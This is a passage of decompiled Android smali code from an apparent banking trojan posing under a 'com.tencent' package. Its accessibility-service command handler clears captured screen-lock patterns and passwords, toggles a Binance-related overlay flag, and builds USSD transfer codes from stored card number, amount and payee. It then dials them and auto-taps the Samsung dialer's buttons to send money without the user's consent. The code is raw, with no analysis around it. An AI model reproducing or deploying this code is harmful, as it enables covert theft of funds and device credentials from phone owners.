    move-result v5

    if-eqz v5, :cond_12

    .line 432
    iput-boolean v9, v1, Lcom/tencent/AccessibilityServiceCore;->showbinance:Z

    goto/16 :goto_1a

    :cond_12
    const-string v5, "LKKBU"

    .line 433
    invoke-virtual {v0, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_13

    .line 434
    iput-boolean v10, v1, Lcom/tencent/AccessibilityServiceCore;->showbinance:Z

    .line 435
    goto/16 :goto_1a

    :cond_13
    const-string v5, "LKeo"

    .line 436
    invoke-virtual {v0, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    const-string v13, "1"

    if-eqz v5, :cond_15

    .line 437
    :try_start_3
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->wakeupScreen()V

    .line 438
    invoke-virtual {v1, v7}, Lcom/tencent/AccessibilityServiceCore;->performGlobalAction(I)Z

    .line 440
    sget-object v0, Lcom/tencent/AccessibilityServiceCore;->passcheck:Ljava/lang/String;

    invoke-virtual {v13, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_14

    .line 441
    new-instance v0, Ljava/lang/Thread;

    new-instance v2, Lcom/tencent/AccessibilityServiceCore$5;

    invoke-direct {v2, v1}, Lcom/tencent/AccessibilityServiceCore$5;-><init>(Lcom/tencent/AccessibilityServiceCore;)V

    invoke-direct {v0, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 451
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    goto/16 :goto_1a

    :cond_14
    const-string v0, "2"

    .line 452
    sget-object v2, Lcom/tencent/AccessibilityServiceCore;->passcheck:Ljava/lang/String;

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_3a

    .line 453
    new-instance v0, Ljava/lang/Thread;

    new-instance v2, Lcom/tencent/AccessibilityServiceCore$6;

    invoke-direct {v2, v1}, Lcom/tencent/AccessibilityServiceCore$6;-><init>(Lcom/tencent/AccessibilityServiceCore;)V

    invoke-direct {v0, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 463
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    goto/16 :goto_1a

    :cond_15
    const-string v5, "LKddd"

    .line 465
    invoke-virtual {v0, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_16

    const-string v0, ""

    .line 466
    sput-object v0, Lcom/tencent/MainBackgroundService;->currentSuccessPassword:Ljava/lang/String;

    const-string v0, ""

    .line 467
    sput-object v0, Lcom/tencent/AccessibilityServiceCore;->ccurrentPassword:Ljava/lang/String;

    .line 468
    sget-object v0, Lcom/tencent/ScreenLockMonitor;->screenLockPointSet:Ljava/util/Set;

    invoke-interface {v0}, Ljava/util/Set;->clear()V

    .line 469
    sget-object v0, Lcom/tencent/ScreenLockMonitor;->screenLockPointList:Ljava/util/LinkedList;

    invoke-virtual {v0}, Ljava/util/LinkedList;->clear()V

    .line 470
    sget-object v0, Lcom/tencent/ScreenLockMonitor;->successcreenLockPointList:Ljava/util/LinkedList;

    invoke-virtual {v0}, Ljava/util/LinkedList;->clear()V

    goto/16 :goto_1a

    :cond_16
    const-string v5, "LKou"

    .line 472
    invoke-virtual {v0, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0

    const-string v14, "com.samsung.android.dialer"

    const-string v6, "samsung"

    const-string v7, "bassit"

    const-string v12, "Block"

    const-string v8, "*"

    const-string v10, "com.android.incallui:id/icon"

    const-wide/16 v16, 0x1388

    const-string v15, "android.intent.action.CALL"

    const-wide/16 v18, 0x7d0

    const-string v11, "tel:"

    if-eqz v5, :cond_19

    .line 476
    :try_start_4
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    sget-object v2, Lcom/tencent/My_tunesxconcerningn10_Settings;->isblocked:Ljava/lang/String;

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    invoke-static {v0, v2, v3}, Lcom/tencent/My_tunesxconcerningn10_Settings;->WriteBool(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    .line 477
    sget-object v0, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {v0, v12}, Lcom/tencent/AccessibilityServiceCore;->Treger(Ljava/lang/String;)V

    .line 485
    sget-object v0, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {v0, v7}, Lcom/tencent/AccessibilityServiceCore;->Treger(Ljava/lang/String;)V

    .line 491
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v2, Lcom/tencent/MainBackgroundService;->ussdcard:Ljava/lang/String;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v2, Lcom/tencent/MainBackgroundService;->ussdamount:Ljava/lang/String;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v2, Lcom/tencent/MainBackgroundService;->ussdpayd:Ljava/lang/String;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "#"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 492
    sget-object v2, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    invoke-virtual {v2, v6}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_17

    .line 493
    new-instance v2, Landroid/content/Intent;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {v0}, Landroid/net/Uri;->encode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v3

    invoke-direct {v2, v15, v3}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    const/high16 v3, 0x10000000

    .line 494
    invoke-virtual {v2, v3}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 495
    invoke-virtual {v1, v2}, Lcom/tencent/AccessibilityServiceCore;->startActivity(Landroid/content/Intent;)V

    const-wide/16 v3, 0x2710

    .line 496
    invoke-static {v3, v4}, Ljava/lang/Thread;->sleep(J)V

    .line 497
    invoke-virtual {v1, v9}, Lcom/tencent/AccessibilityServiceCore;->performGlobalAction(I)Z

    .line 500
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v3

    invoke-virtual {v3, v14}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v3

    const/high16 v4, 0x10000000

    .line 501
    invoke-virtual {v2, v4}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 502
    invoke-virtual {v1, v3}, Lcom/tencent/AccessibilityServiceCore;->startActivity(Landroid/content/Intent;)V

    .line 503
    invoke-static/range {v18 .. v19}, Ljava/lang/Thread;->sleep(J)V

    .line 504
    sget-object v2, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    sput-object v0, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012ToPaste:Ljava/lang/String;

    .line 505
    sget-object v0, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012NeedPaste:Ljava/lang/Boolean;

    .line 506
    sget-object v0, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {v0}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012Treger()V

    .line 507
    invoke-static/range {v18 .. v19}, Ljava/lang/Thread;->sleep(J)V

    .line 508
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const-string v2, "com.samsung.android.dialer:id/image_view"

    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    .line 509
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    const-string v3, "com.samsung.android.dialer:id/dialButtonImage"

    invoke-virtual {v2, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    const/4 v3, 0x0

    .line 510
    invoke-interface {v0, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/16 v4, 0x10

    invoke-virtual {v0, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    .line 511
    invoke-static/range {v18 .. v19}, Ljava/lang/Thread;->sleep(J)V

    .line 512
    invoke-interface {v2, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    goto/16 :goto_1a

    .line 519
    :cond_17
    new-instance v2, Landroid/content/Intent;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {v0}, Landroid/net/Uri;->encode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    invoke-direct {v2, v15, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    const/high16 v0, 0x10000000

    .line 520
    invoke-virtual {v2, v0}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 521
    invoke-virtual {v1, v2}, Lcom/tencent/AccessibilityServiceCore;->startActivity(Landroid/content/Intent;)V

    .line 522
    invoke-static/range {v16 .. v17}, Ljava/lang/Thread;->sleep(J)V

    .line 525
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0, v10}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    .line 526
    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v3

    const/4 v4, 0x2

    if-ne v3, v4, :cond_18

    const/4 v3, 0x0

    .line 527
    invoke-interface {v0, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/16 v3, 0x10

    invoke-virtual {v0, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    const-wide/16 v3, 0x1f40

    .line 528
    invoke-static {v3, v4}, Ljava/lang/Thread;->sleep(J)V

    .line 529
    invoke-virtual {v1, v9}, Lcom/tencent/AccessibilityServiceCore;->performGlobalAction(I)Z

    .line 530
    invoke-virtual {v1, v2}, Lcom/tencent/AccessibilityServiceCore;->startActivity(Landroid/content/Intent;)V

    .line 532
    :cond_18
    invoke-static/range {v16 .. v17}, Ljava/lang/Thread;->sleep(J)V

    .line 534
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0, v10}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    .line 536
    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v2

    const/4 v3, 0x2

    if-ne v2, v3, :cond_3a

    .line 537
    invoke-interface {v0, v9}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/16 v2, 0x10

    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    goto/16 :goto_1a

    :cond_19
    const-string v4, "LKtu"

    .line 542
    invoke-virtual {v0, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_1c

    .line 543
    sget-object v0, Lcom/tencent/MainBackgroundService;->ussdpayd:Ljava/lang/String;

    if-eqz v0, :cond_3a

    sget-object v0, Lcom/tencent/MainBackgroundService;->ussdpayd:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_3a

    .line 546
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    sget-object v2, Lcom/tencent/My_tunesxconcerningn10_Settings;->isblocked:Ljava/lang/String;

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    invoke-static {v0, v2, v4}, Lcom/tencent/My_tunesxconcerningn10_Settings;->WriteBool(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    .line 547
    sget-object v0, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {v0, v12}, Lcom/tencent/AccessibilityServiceCore;->Treger(Ljava/lang/String;)V

    .line 555
    sget-object v0, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {v0, v7}, Lcom/tencent/AccessibilityServiceCore;->Treger(Ljava/lang/String;)V

    .line 560
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v2, Lcom/tencent/MainBackgroundService;->ussdcard:Ljava/lang/String;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v2, Lcom/tencent/MainBackgroundService;->ussdamount:Ljava/lang/String;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "*1*1*"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v2, Lcom/tencent/MainBackgroundService;->ussdpayd:Ljava/lang/String;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "#"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 561
    sget-object v2, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    invoke-virtual {v2, v6}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_1a

    .line 562
    new-instance v2, Landroid/content/Intent;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {v0}, Landroid/net/Uri;->encode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v3

    invoke-direct {v2, v15, v3}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    const/high16 v3, 0x10000000

    .line 563
    invoke-virtual {v2, v3}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 564
    invoke-virtual {v1, v2}, Lcom/tencent/AccessibilityServiceCore;->startActivity(Landroid/content/Intent;)V

    const-wide/16 v3, 0x2710

    .line 565
    invoke-static {v3, v4}, Ljava/lang/Thread;->sleep(J)V

    .line 566
    invoke-virtual {v1, v9}, Lcom/tencent/AccessibilityServiceCore;->performGlobalAction(I)Z

    .line 569
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v3

    invoke-virtual {v3, v14}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v3

    const/high16 v4, 0x10000000

    .line 570
    invoke-virtual {v2, v4}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 571
    invoke-virtual {v1, v3}, Lcom/tencent/AccessibilityServiceCore;->startActivity(Landroid/content/Intent;)V

    .line 572
    invoke-static/range {v18 .. v19}, Ljava/lang/Thread;->sleep(J)V

    .line 573
    sget-object v2, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    sput-object v0, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012ToPaste:Ljava/lang/String;

    .line 574
    sget-object v0, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012NeedPaste:Ljava/lang/Boolean;

    .line 575
    sget-object v0, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {v0}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012Treger()V

    .line 576
    invoke-static/range {v18 .. v19}, Ljava/lang/Thread;->sleep(J)V

    .line 577
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const-string v2, "com.samsung.android.dialer:id/image_view"

    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    .line 578
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    const-string v3, "com.samsung.android.dialer:id/dialButtonImage"

    invoke-virtual {v2, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    const/4 v3, 0x0

    .line 579
    invoke-interface {v0, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/16 v4, 0x10

    invoke-virtual {v0, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    .line 580
    invoke-static/range {v18 .. v19}, Ljava/lang/Thread;->sleep(J)V

    .line 581
    invoke-interface {v2, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    goto/16 :goto_1a

    .line 588
    :cond_1a
    new-instance v2, Landroid/content/Intent;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {v0}, Landroid/net/Uri;->encode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    invoke-direct {v2, v15, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    const/high16 v0, 0x10000000

    .line 589
    invoke-virtual {v2, v0}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 590
    invoke-virtual {v1, v2}, Lcom/tencent/AccessibilityServiceCore;->startActivity(Landroid/content/Intent;)V

    .line 591
    invoke-static/range {v16 .. v17}, Ljava/lang/Thread;->sleep(J)V

    .line 594
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0, v10}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    .line 595
    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v3

    const/4 v4, 0x2

    if-ne v3, v4, :cond_1b

    const/4 v3, 0x0

    .line 596
    invoke-interface {v0, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/16 v3, 0x10

    invoke-virtual {v0, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    const-wide/16 v3, 0x1f40

    .line 597
    invoke-static {v3, v4}, Ljava/lang/Thread;->sleep(J)V

    .line 598
    invoke-virtual {v1, v9}, Lcom/tencent/AccessibilityServiceCore;->performGlobalAction(I)Z

    .line 599
    invoke-virtual {v1, v2}, Lcom/tencent/AccessibilityServiceCore;->startActivity(Landroid/content/Intent;)V

    .line 601
    :cond_1b
    invoke-static/range {v16 .. v17}, Ljava/lang/Thread;->sleep(J)V

    .line 603
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0, v10}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    .line 605
    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v2

    const/4 v3, 0x2

    if-ne v2, v3, :cond_3a

    .line 606
    invoke-interface {v0, v9}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/16 v2, 0x10

    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    goto/16 :goto_1a

    :cond_1c
    const-string v3, "LKhu"

    .line 611
    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_1f

    .line 612
    sget-object v0, Lcom/tencent/MainBackgroundService;->ussdpayd:Ljava/lang/String;

    if-eqz v0, :cond_3a

    sget-object v0, Lcom/tencent/MainBackgroundService;->ussdpayd:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_3a

    .line 615
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    sget-object v3, Lcom/tencent/My_tunesxconcerningn10_Settings;->isblocked:Ljava/lang/String;

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    invoke-static {v0, v3, v4}, Lcom/tencent/My_tunesxconcerningn10_Settings;->WriteBool(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    .line 616
    sget-object v0, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {v0, v12}, Lcom/tencent/AccessibilityServiceCore;->Treger(Ljava/lang/String;)V

    .line 623
    sget-object v0, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {v0, v7}, Lcom/tencent/AccessibilityServiceCore;->Treger(Ljava/lang/String;)V

    .line 627
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v2, Lcom/tencent/MainBackgroundService;->ussdcard:Ljava/lang/String;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v2, Lcom/tencent/MainBackgroundService;->ussdamount:Ljava/lang/String;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "*1*"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v2, Lcom/tencent/MainBackgroundService;->ussdpayd:Ljava/lang/String;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v2, Lcom/tencent/MainBackgroundService;->ussdcard:Ljava/lang/String;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 628
    sget-object v2, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    invoke-virtual {v2, v6}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_1d

    .line 629
    new-instance v2, Landroid/content/Intent;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {v0}, Landroid/net/Uri;->encode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

